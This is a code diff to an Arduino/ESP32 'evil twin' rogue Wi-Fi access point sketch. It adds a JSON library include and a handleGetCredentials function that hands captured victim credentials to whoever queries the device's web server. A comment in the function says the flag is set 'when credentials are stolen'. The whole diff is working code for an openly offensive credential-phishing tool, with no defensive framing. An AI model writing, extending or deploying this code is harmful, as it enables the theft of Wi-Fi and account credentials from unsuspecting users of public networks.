@@ -1,6 +1,7 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
+#include <ArduinoJson.h>
 #include "./globals.h"
 
 #define DNS_PORT 53
@@ -115,4 +116,22 @@ void handleDNS() {
 
 void startEvilTwin() {
   initEvilTwin();
+}
+
+void handleGetCredentials() {
+  if (capnew) { // capnew is the flag that gets set when credentials are stolen
+    JsonDocument doc;
+    doc["email"] = ssid;
+    doc["password"] = pass;
+    
+    String json;
+    serializeJson(doc, json);
+    server.send(200, "application/json", json);
+
+    // Reset the flag so we don't send the same credentials again
+    capnew = false;
+  } else {
+    // No new credentials, send an empty object
+    server.send(200, "application/json", "{}");
+  }
 }
